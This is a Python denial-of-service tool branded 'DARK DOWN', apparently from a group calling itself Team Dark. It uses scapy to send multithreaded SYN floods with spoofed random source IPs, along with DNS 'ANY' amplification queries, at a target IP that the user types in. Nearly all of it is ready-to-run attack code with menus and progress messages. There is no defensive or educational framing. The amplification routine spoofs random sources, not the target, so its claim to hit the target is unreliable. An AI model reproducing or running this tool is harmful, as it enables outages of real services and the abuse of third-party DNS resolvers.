import os
import time
import sys
import random
import threading
from scapy.all import IP, TCP, UDP, DNS, DNSQR, send
from colorama import init, Fore, Style

init()

def clear_screen():
    os.system('clear')

def banner():
    print(Fore.RED + """
    ██████╗  █████╗ ██████╗ ██╗  ██╗    ██████╗  ██████╗ ██╗    ██╗███╗   ██╗
    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██╔═══██╗██║    ██║████╗  ██║
    ██║  ██║███████║██████╔╝█████╔╝     ██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
    ██║  ██║██╔══██║██╔══██╗██╔═██╗     ██║  ██║██║   ██║██║███╗██║██║╚██╗██║
    ██████╔╝██║  ██║██║  ██║██║  ██╗    ██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + "AUTHOR - @darkhub__a1" + Style.RESET_ALL)
    print(Fore.GREEN + "TEAM - DARK" + Style.RESET_ALL)
    print(Fore.CYAN + "---------------------------------------" + Style.RESET_ALL)

# SYN Flood Function
def syn_flood(target_ip, target_port, packet_count, thread_id):
    sent_packets = 0
    while sent_packets < packet_count:
        try:
            src_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
            src_port = random.randint(1024, 65535)
            ip_layer = IP(src=src_ip, dst=target_ip)
            tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
            packet = ip_layer / tcp_layer
            send(packet, verbose=0)
            sent_packets += 1
            print(Fore.YELLOW + f"[*] Thread {thread_id} - SYN Packet {sent_packets} sent to {target_ip}:{target_port}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Thread {thread_id} - SYN Error: {str(e)}" + Style.RESET_ALL)

# DNS Amplification Function
def dns_amplification(target_ip, dns_server, packet_count, thread_id):
    sent_packets = 0
    while sent_packets < packet_count:
        try:
            src_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
            ip_layer = IP(src=src_ip, dst=dns_server)
            udp_layer = UDP(sport=random.randint(1024, 65535), dport=53)
            dns_layer = DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ANY"))
            packet = ip_layer / udp_layer / dns_layer
            send(packet, verbose=0)
            sent_packets += 1
            print(Fore.YELLOW + f"[*] Thread {thread_id} - DNS Amp Packet {sent_packets} sent to {dns_server} (target: {target_ip})" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Thread {thread_id} - DNS Error: {str(e)}" + Style.RESET_ALL)

def multi_thread_attack(target_ip, base_port, port_range, packet_count, thread_count, dns_server):
    threads = []
    packets_per_thread = packet_count // thread_count
    
    # SYN Flood Threads
    for i in range(thread_count // 2):  # Half threads for SYN
        target_port = base_port + random.randint(0, port_range)
        thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, packets_per_thread, i+1))
        threads.append(thread)
        thread.start()
    
    # DNS Amplification Threads
    for i in range(thread_count // 2, thread_count):  # Half threads for DNS
        thread = threading.Thread(target=dns_amplification, args=(target_ip, dns_server, packets_per_thread, i+1))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def start_ddos():
    print(Fore.GREEN + "[+] Starting DARK DOWN Ultimate SYN + DNS Amp Flood..." + Style.RESET_ALL)
    time.sleep(1)
    
    target_ip = input(Fore.WHITE + "Enter target IP (e.g., 192.168.1.1): " + Style.RESET_ALL)
    base_port = int(input(Fore.WHITE + "Enter base target port (e.g., 80 for HTTP): " + Style.RESET_ALL))
    port_range = int(input(Fore.WHITE + "Enter port range to flood (e.g., 10 for ports 80-89): " + Style.RESET_ALL))
    packet_count = int(input(Fore.WHITE + "Enter total number of packets (e.g., 10000): " + Style.RESET_ALL))
    thread_count = int(input(Fore.WHITE + "Enter number of threads (e.g., 10): " + Style.RESET_ALL))
    dns_server = input(Fore.WHITE + "Enter DNS server IP for amplification (e.g., 8.8.8.8): " + Style.RESET_ALL)
    
    print(Fore.YELLOW + f"[*] Launching SYN + DNS Amp flood on {target_ip} ports {base_port}-{base_port+port_range}..." + Style.RESET_ALL)
    print(Fore.CYAN + "[*] Press Ctrl+C to stop the attack." + Style.RESET_ALL)
    
    try:
        multi_thread_attack(target_ip, base_port, port_range, packet_count, thread_count, dns_server)
        print(Fore.GREEN + "[+] Attack completed!" + Style.RESET_ALL)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Stopping DARK DOWN..." + Style.RESET_ALL)

def exit_message():
    clear_screen()
    print(Fore.MAGENTA + """
    ███████╗███████╗███████╗    ██╗   ██╗ █████╗ ██████╗ ██████╗██╗   ██╗██╗
    ██╔════╝██╔════╝██╔════╝    ██║   ██║██╔══██╗██╔══██╗██╔══██╗██║   ██║██║
    █████╗  █████╗  █████╗      ██║   ██║███████║██████╔╝██║  ██║██║   ██║██║
    ██╔══╝  ██╔══╝  ██╔══╝      ╚██╗ ██╔╝██╔══██║██╔══██╗██║  ██║██║   ██║██║
    ███████╗██║     ██║          ╚████╔╝ ██║  ██║██║  ██║██████╔╝╚██████╔╝██║
    ╚══════╝╚═╝     ╚═╝           ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + "Stay Dark, Stay Safe! - @darkhub__a1 & Team Dark" + Style.RESET_ALL)
    sys.exit()

def main_menu():
    while True:
        clear_screen()
        banner()
        print(Fore.CYAN + "\n[1] START - Launch DARK DOWN Ultimate SYN + DNS Amp Flood" + Style.RESET_ALL)
        print(Fore.CYAN + "[2] EXIT - Leave with a cool vibe" + Style.RESET_ALL)
        choice = input(Fore.WHITE + "\nEnter your choice (1/2): " + Style.RESET_ALL)
        
        if choice == "1":
            clear_screen()
            banner()
            start_ddos()
        elif choice == "2":
            exit_message()
        else:
            print(Fore.RED + "[!] Invalid choice. Try again!" + Style.RESET_ALL)
            time.sleep(1)

if __name__ == "__main__":
    main_menu()